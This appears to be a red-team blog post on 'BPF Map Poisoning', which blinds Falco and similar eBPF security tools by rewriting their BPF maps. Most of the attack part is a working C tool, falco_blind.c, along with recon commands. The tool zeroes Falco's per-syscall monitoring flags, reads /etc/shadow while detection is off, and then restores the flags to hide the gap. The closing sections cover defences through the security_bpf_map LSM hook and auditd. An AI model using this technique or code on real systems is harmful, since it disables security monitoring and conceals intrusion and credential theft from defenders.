---
title: "BPF Map Poisoning: Attacking the EDR from the Inside"
date: 2026-07-06T00:00:00-03:00
description: "Most evasion techniques try to avoid the EDR. This one walks straight into it and writes to its memory."
categories: [Malware]
tags: [EDR Evasion, eBPF, Falco, Linux, Red Team]
author: 0xMatheuZ
draft: false
ShowToc: true
TocOpen: true
UseHugoToc: true
images:
  - "https://i.imgur.com/OGmNt4g.png"
---

![imgur](https://i.imgur.com/0Tyj00A.gif)

Most evasion techniques work by flying under the radar. You use an anonymous `mmap` instead of a file, you call syscalls directly to skip libc hooks, you execute from a `memfd` so `fanotify` never sees a path. All of that works by avoiding the EDR's detection surface.

BPF Map Poisoning is different. Instead of avoiding the EDR, you walk straight into it and rewrite its memory.

I use Falco as the demo target throughout this post because it is open-source, auditable, and easy to reproduce in a lab. Falco is not a traditional EDR, it's a runtime security tool. But the attack surface here is architectural, not Falco-specific. CrowdStrike Falcon on Linux, Elastic Defend, Tetragon, and any other security tool that stores monitoring state in BPF maps share the same problem: if the maps are not protected by `security_bpf_map` LSM enforcement, they can be read and written by any privileged process using the standard `bpf(2)` API. The demo is Falco. The implication extends to everything that follows the same design.

## How eBPF EDRs actually work

To understand why this attack works, you need to understand how these tools are built internally.

Tools like Falco, Tetragon, Elastic Defend, and CrowdStrike Falcon on Linux all share the same fundamental design: detection logic runs as eBPF programs inside the kernel. The attachment mechanism varies by tool. CrowdStrike and Elastic use kprobes or fentry hooks per syscall. Falco attaches to the raw `sys_enter`/`sys_exit` tracepoints, which fire for every syscall through a single hook. Regardless of the mechanism, every time a monitored event fires, the eBPF program runs inside the kernel, inspects the arguments, and decides whether to emit a security alert.

The problem is that eBPF programs are stateless. They cannot maintain persistent state across invocations without an external data store. That data store is BPF maps.

BPF maps are kernel data structures that live in kernel memory and can be accessed from both sides of the boundary. The eBPF program running in-kernel accesses them with helpers like `bpf_map_lookup_elem` and `bpf_map_update_elem`. Userspace accesses them through the `bpf(2)` syscall. This bidirectional access is by design, it's how the EDR's kernel component and its userspace agent communicate with each other.

A typical eBPF EDR maintains maps like these:

| Map name | Type | Purpose |
|---|---|---|
| `interesting_sys` | array[512] | Controls which syscalls are monitored. Index = syscall number, value = 1 (monitor) or 0 (skip) |
| `trusted_pids` | hash | PIDs the EDR should not alert on |
| `syscall_exit_ta` | prog_array | Tail call table that dispatches execution to per-syscall handler programs |
| ring buffer | ringbuf | Kernel-to-userspace event delivery channel |
| `capture_settings` | array | Runtime configuration flags |

These maps are not internal-only structures. They are created via the standard `bpf()` syscall API and can be opened and written to by any process with `CAP_BPF` or `CAP_SYS_ADMIN`. This is not a bug. It is how the Linux BPF API is designed to work.

## The attack

If the EDR's eBPF program checks an `interesting_sys` array before emitting an alert, and you zero out entries in that array for specific syscalls, the eBPF program will see `0` and return early without generating any event. The EDR keeps running. It still intercepts every syscall. It just silently skips the ones you zeroed in the map.

Two variants:

**Variant 1: PID allowlist poisoning.** If the EDR maintains a `trusted_pids` hash map, insert your PID into it. The EDR will treat your process as legitimate and suppress all alerts from it, regardless of what syscalls you make.

**Variant 2: Syscall monitoring suppression.** Zero out specific entries in `interesting_sys`. Every process on the system becomes unmonitored for those syscalls for as long as the entries stay zeroed. More powerful but noisier: a complete silence on `execve` events is anomalous if someone is watching.

We will target `interesting_sys` with the save/blind/restore pattern: save original values, zero the entries, run the payload, restore. The resulting gap looks like a processing hiccup rather than tampering.

## Recon: finding the map IDs

First step is identifying which map IDs belong to Falco:

```bash
sudo bpftool map list | grep -E "interesting_sys|syscall_exit_ta"
```

![map recon output](/img/falco-bpf-poison/map-recon.png)

`interesting_sys` is map **155**, `syscall_exit_ta` is map **153**. Those are the IDs we pass to the tool.

For a broader recon when you don't know the map names upfront:

```bash
sudo bpftool map list -j | python3 -c "
import sys, json
for m in json.load(sys.stdin):
    if m.get('type') in ('hash', 'array', 'percpu_hash', 'lru_hash'):
        key = m.get('bytes_key', m.get('key_size', '?'))
        val = m.get('bytes_value', m.get('value_size', '?'))
        print(f\"Map {m['id']}: {m['type']} name={m.get('name','')} key={key}B val={val}B max={m.get('max_entries','?')}\")
"
```

A hash map with `bytes_key=4` and `bytes_value=1` is likely a PID allowlist. An array with `max_entries=512` and `bytes_value=1` is a per-syscall flag table like `interesting_sys`.

To find which eBPF programs are loaded and which maps they reference:

```bash
sudo bpftool prog list
# then for each suspicious program:
sudo bpftool prog show id <prog_id>
# Output includes: map_ids 153 155 156 ...
```

Dump the current state of `interesting_sys` to understand the schema before touching it:

```bash
sudo bpftool map dump id 155 | head -20
# key: 00 00 00 00
# value: 01          <- syscall 0 (read) monitored
# key: 01 00 00 00
# value: 01          <- syscall 1 (write) monitored
# key: 3b 00 00 00
# value: 01          <- syscall 59 (execve) monitored
```

Every entry with value `01` is an active monitoring rule. Zero it and Falco goes blind for that syscall.

## Proof: Falco detecting normally

Before running anything, confirm Falco is actually catching things. Open `/etc/shadow` and verify the alert fires:

![Falco detecting /etc/shadow access with timestamp](/img/falco-bpf-poison/falco-detecting-normal.png)

Left terminal shows `cat /etc/shadow` at `16:46:12`. Right terminal shows Falco's warning `Sensitive file opened for reading` at exactly `16:46:12`. Working as expected.

Full alert detail including `file=/etc/shadow`, `process=cat`, `user_uid=0`, `evt_type=openat`:

![Full Falco alert log entry](/img/falco-bpf-poison/falco-alert-detail.png)

This is the baseline. Now we kill it.

## Syscall suppression with restore: falco_blind.c

`interesting_sys` is a 512-entry array where each index is a syscall number and each value is either `1` (Falco monitors this syscall) or `0` (Falco skips it entirely). When Falco's eBPF program fires on a syscall entry, the first thing it does is look up `interesting_sys[syscall_nr]`. If it gets `0`, it returns immediately without generating any event. The rest of the hook logic, the rule matching, the ring buffer write, none of it runs.

That's the lever. Zero the entries for the syscalls your payload uses and Falco produces nothing for the duration.

Permanently zeroing them would work but it's noisy: a SIEM with a baseline alert rate will notice that `execve` stopped generating events entirely. The cleaner approach is surgical: save the original values, zero the entries, run the payload, write the originals back. The result is a brief window of silence in Falco's event stream that looks like a processing hiccup rather than tampering.

The syscalls we target:

| Nr | Syscall | Why |
|---|---|---|
| 59 | execve | process execution |
| 322 | execveat | execve variant (fd-relative) |
| 257 | openat | file opens, including /etc/shadow |
| 2 | open | older open() variant |
| 42 | connect | outbound network connections |
| 41 | socket | socket creation |
| 0 | read | file reads |
| 1 | write | file writes |

The tool takes two map IDs as arguments: `interesting_sys` and `syscall_exit_ta`. It opens both file descriptors at startup to fail early if either ID is wrong, but only reads and writes to `interesting_sys`. The `syscall_exit_ta` check is a sanity guard: if you can open it, you have the right Falco instance and the right privilege level.

```c
#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

static const uint32_t targets[] = {
    59, 322, 257, 2, 42, 41, 0, 1,
};
#define NTARGETS (sizeof(targets)/sizeof(targets[0]))

#define BPF_ATTR_SZ(last_field) \
    (offsetof(union bpf_attr, last_field) + sizeof(((union bpf_attr *)0)->last_field))

static int bpf_fd(uint32_t id) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_id = id;
    return (int)syscall(__NR_bpf, BPF_MAP_GET_FD_BY_ID, &a, BPF_ATTR_SZ(map_id));
}

static int map_lookup(int fd, uint32_t key, void *val) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    return (int)syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &a, BPF_ATTR_SZ(value));
}

static int map_update(int fd, uint32_t key, const void *val) {
    union bpf_attr a; memset(&a, 0, sizeof(a));
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&key;
    a.value  = (uint64_t)(uintptr_t)val;
    a.flags  = BPF_ANY;
    return (int)syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &a, BPF_ATTR_SZ(flags));
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <interesting_sys_id> <syscall_exit_ta_id>\n", argv[0]);
        return 1;
    }

    int fd_isys = bpf_fd((uint32_t)atoi(argv[1]));
    int fd_eta  = bpf_fd((uint32_t)atoi(argv[2]));
    if (fd_isys < 0) { perror("open interesting_sys"); return 1; }
    if (fd_eta  < 0) { perror("open syscall_exit_ta"); return 1; }

    uint8_t saved[NTARGETS];
    uint8_t zero = 0;

    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_lookup(fd_isys, targets[i], &saved[i]) < 0) {
            fprintf(stderr, "[!] lookup failed for syscall %u: %s\n", targets[i], strerror(errno));
            return 1;
        }
        printf("[save]  syscall %3u  original=%u\n", targets[i], saved[i]);
    }

    for (size_t i = 0; i < NTARGETS; i++) {
        map_update(fd_isys, targets[i], &zero);
        printf("[blind] syscall %3u\n", targets[i]);
    }
    printf("[*] Falco blinded for %zu syscalls. Running payload...\n\n", NTARGETS);

    system("/bin/sh -c 'cat /etc/shadow; id; whoami'");

    printf("\n[*] Restoring...\n");
    for (size_t i = 0; i < NTARGETS; i++) {
        if (map_update(fd_isys, targets[i], &saved[i]) == 0)
            printf("[restore] syscall %3u -> %u\n", targets[i], saved[i]);
        else
            fprintf(stderr, "[!] restore failed for syscall %u\n", targets[i]);
    }

    printf("[*] Done. Falco is monitoring again.\n");
    return 0;
}
```

The only map we write to is `interesting_sys`. Falco's eBPF program checks that flag before anything else, so zeroing the entry is enough to short-circuit the entire detection path for that syscall.

```bash
gcc -O2 -o falco_blind falco_blind.c
sudo ./falco_blind 155 153
```

## The gap in Falco's timeline

Left: the payload running at `17:04:02`. `/etc/shadow` fully exposed, `uid=0(root)`, `whoami` returning `root`, restore completing cleanly. Right: Falco's log shows alerts at `16:46:12`, `16:58:19`, `17:01:06`... then nothing at `17:04`. Complete silence.

![falco_blind running, /etc/shadow exposed, no alert in Falco](/img/falco-bpf-poison/blind-no-alert.png)

Falco is still running. The process is still active. The eBPF program is still attached to the raw syscall tracepoint and fires on every syscall. It just isn't generating anything.

After the restore phase, the next `cat /etc/shadow` at `17:05:53` immediately produces an alert at `17:05:53`:

![Falco detecting again after restore](/img/falco-bpf-poison/falco-restored.png)

The moment the restore writes run, Falco picks up again. No restart, no reload.

## Why this works

`bpf(BPF_MAP_UPDATE_ELEM)` is a first-class kernel API call. It's not memory corruption, not a kernel exploit, not a hook bypass. It's the legitimate, documented way to modify a BPF map from userspace. That's exactly what the EDR vendor uses to configure the tool at runtime.

Falco's eBPF program has no way to distinguish a legitimate write (the Falco agent updating its config) from a malicious one (an attacker zeroing its monitoring rules). Both go through the same `BPF_MAP_UPDATE_ELEM` interface with the same permissions. There's no signature, no kernel-enforced write policy, no per-map ownership check at the API level.

The detection logic and the configuration state share the same access control boundary as the threat they're trying to monitor. An attacker with `CAP_BPF` can reconfigure the EDR the same way the EDR's own agent does.

## Privilege requirement

This requires `CAP_BPF` or `CAP_SYS_ADMIN`. The `BPF_MAP_GET_FD_BY_ID` command is a privileged operation unconditionally. The `kernel.unprivileged_bpf_disabled` sysctl controls `BPF_PROG_LOAD` and socket filters, not map management. You need a privileged context regardless: root shell, a process with elevated capabilities, or a prior privesc.

This was tested against Falco running with `engine.kind=modern_ebpf` (`falco-modern-bpf.service`), which is the default on modern kernels with BTF support.

This is a post-exploitation technique. In a red team engagement where you already have root, this is a clean way to operate without generating the alerts that would normally follow lateral movement, credential dumping, or persistence installation.

## The `security_bpf_map` LSM hook

The kernel provides a hook that closes this completely: `security_bpf_map`. When a process calls `bpf(BPF_MAP_UPDATE_ELEM)` on a specific map, the kernel invokes `security_bpf_map(map, fmode)` before granting access. An LSM module or BPF LSM program can enforce that only the Falco agent process is allowed to write to Falco's maps. Any other caller gets `-EPERM`.

Check if any LSM BPF programs are loaded before attempting the write:

```bash
sudo bpftool prog list | grep lsm
```

And verify directly whether the write goes through:

```bash
sudo bpftool map update id 155 key hex 3b 00 00 00 value hex 00
# Operation not permitted = security_bpf_map is enforced, maps are protected
# No error = maps are open, technique works
```

Whether this works depends entirely on whether the target enforces `security_bpf_map`. Most Falco deployments don't by default. Check before assuming.

## Forensic trace

The `BPF_MAP_UPDATE_ELEM` call is auditable via `auditd`:

```bash
auditctl -a always,exit -F arch=b64 -S bpf -k bpf_map_write
ausearch -k bpf_map_write
```

The audit record contains the calling process PID and UID and the `bpf()` syscall number, but not the specific map ID being written to. Correlating it with map ownership requires a separate step.

The other signal is the event gap. If your SIEM has a baseline for how many `execve` or `openat` events Falco produces per minute, a window of silence on those event types is worth investigating even if no individual alert fired.

## References

- [Falco source: interesting_sys map definition](https://github.com/falcosecurity/libs)
- [Linux bpf(2) man page](https://man7.org/linux/man-pages/man2/bpf.2.html)
- [kernel/bpf/syscall.c: security_bpf_map hook](https://elixir.bootlin.com/linux/latest/source/kernel/bpf/syscall.c)
- [Tetragon: BPF map access control](https://github.com/cilium/tetragon)
- [bpftool documentation](https://github.com/libbpf/bpftool)
